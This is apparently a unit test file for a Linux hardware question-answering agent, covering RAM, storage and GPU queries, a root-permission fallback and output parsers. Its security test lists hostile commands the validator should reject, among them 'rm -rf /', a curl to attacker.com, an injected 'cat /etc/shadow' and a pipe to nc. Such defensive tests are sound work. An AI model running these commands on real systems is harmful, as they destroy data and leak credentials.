"""
Unit and Integration Tests for Problem 2: Linux Hardware Q&A Assistant.
"""

import unittest
from problem2_linux_hardware_assistant.agent import HardwareQAAgent
from problem2_linux_hardware_assistant.security import (
    CommandSecurityValidator,
    SecurityViolationError,
)
from problem2_linux_hardware_assistant.tools import (
    HardwareToolRegistry,
    MockLinuxBackend,
)
from problem2_linux_hardware_assistant.parsers import (
    HardwareParsers,
    parse_size_to_bytes,
)


class TestHardwareAssistant(unittest.TestCase):

    def setUp(self):
        self.agent = HardwareQAAgent(HardwareToolRegistry(MockLinuxBackend()))

    def test_exact_interview_ram_upgrade_scenario(self):
        """
        Tests the exact prompt example:
        User: "Can I add more RAM, and how much?"
        Assistant replies: "You have 16 GB in 1 of 2 slots. The board supports up to 64 GB, so you can add a stick of up to 32 GB."
        """
        res = self.agent.answer_query("Can I add more RAM, and how much?")
        response = res["response"]
        tools = res["tools_called"]

        self.assertIn("inspect_memory", tools)
        self.assertIn("16 GB in 1 of 2 slots", response)
        self.assertIn("supports up to 64 GB", response)
        self.assertIn("add a stick of up to 32 GB", response)

    def test_ssd_nvme_question(self):
        """Tests: User: 'Is my SSD NVMe?'"""
        res = self.agent.answer_query("Is my SSD NVMe?")
        response = res["response"]

        self.assertIn("inspect_storage", res["tools_called"])
        self.assertTrue("Yes" in response or "NVMe" in response)
        self.assertIn("NVMe", response)

    def test_multi_turn_follow_up_gpu(self):
        """Tests multi-turn context: 'and what about the GPU?'"""
        # Turn 1
        self.agent.answer_query("How much RAM do I have?")
        # Turn 2: Follow-up
        res = self.agent.answer_query("and what about the GPU?")
        response = res["response"]

        self.assertIn("inspect_gpu", res["tools_called"])
        self.assertTrue("NVIDIA" in response or "Intel" in response)
        self.assertIn("GeForce RTX 3060", response)

    def test_security_disallow_arbitrary_shell_execution(self):
        """Tests that arbitrary commands and dangerous shell characters are strictly rejected."""
        # 1. Arbitrary non-allowlisted binary
        with self.assertRaises(SecurityViolationError):
            CommandSecurityValidator.validate_command("rm", ["-rf", "/"])

        with self.assertRaises(SecurityViolationError):
            CommandSecurityValidator.validate_command("curl", ["http://attacker.com"])

        with self.assertRaises(SecurityViolationError):
            CommandSecurityValidator.validate_command("bash", ["-c", "whoami"])

        # 2. Shell metacharacters injection attempt
        with self.assertRaises(SecurityViolationError):
            CommandSecurityValidator.validate_command("free", ["-b; cat /etc/shadow"])

        with self.assertRaises(SecurityViolationError):
            CommandSecurityValidator.validate_command("lsblk", ["-J", "|", "nc", "1.2.3.4", "80"])

        # 3. Disallowed arguments for an allowlisted binary
        with self.assertRaises(SecurityViolationError):
            CommandSecurityValidator.validate_command("free", ["--invalid-flag", "/tmp/bad"])

    def test_security_valid_commands_pass(self):
        """Verifies that allowed command schemas pass validation."""
        bin_path, args = CommandSecurityValidator.validate_command("free", ["-b"])
        self.assertEqual(args, ["-b"])

        bin_path, args = CommandSecurityValidator.validate_command("dmidecode", ["-t", "memory"])
        self.assertEqual(args, ["-t", "memory"])

        bin_path, args = CommandSecurityValidator.validate_command("lscpu", ["-J"])
        self.assertEqual(args, ["-J"])

    def test_root_restricted_memory_fallback(self):
        """Tests graceful degradation when dmidecode is blocked without root."""
        class RestrictedBackend(MockLinuxBackend):
            def run_command(self, binary, args):
                if binary == "dmidecode":
                    return 1, "", "Permission denied: dmidecode requires root privileges"
                return super().run_command(binary, args)

        agent = HardwareQAAgent(HardwareToolRegistry(RestrictedBackend()))
        res = agent.answer_query("Can I add more RAM, and how much?")
        response = res["response"]

        # Must NOT crash, must NOT hallucinate max slots, must explain root requirement
        self.assertIn("root privileges", response.lower())
        self.assertNotIn("supports up to 64 GB", response)

    def test_parsers_unit(self):
        """Tests unit parsers for free, lscpu, and byte conversions."""
        self.assertEqual(parse_size_to_bytes("16 GB"), 16 * (1024**3))
        self.assertEqual(parse_size_to_bytes("64 GB"), 64 * (1024**3))
        self.assertEqual(parse_size_to_bytes("1 TB"), 1 * (1024**4))

        free_out = "Mem: 16000000000 4000000000 8000000000 0 4000000000 12000000000\nSwap: 0 0 0"
        usage = HardwareParsers.parse_free(free_out)
        self.assertEqual(usage.total_bytes, 16000000000)
        self.assertEqual(usage.available_bytes, 12000000000)


if __name__ == "__main__":
    unittest.main()
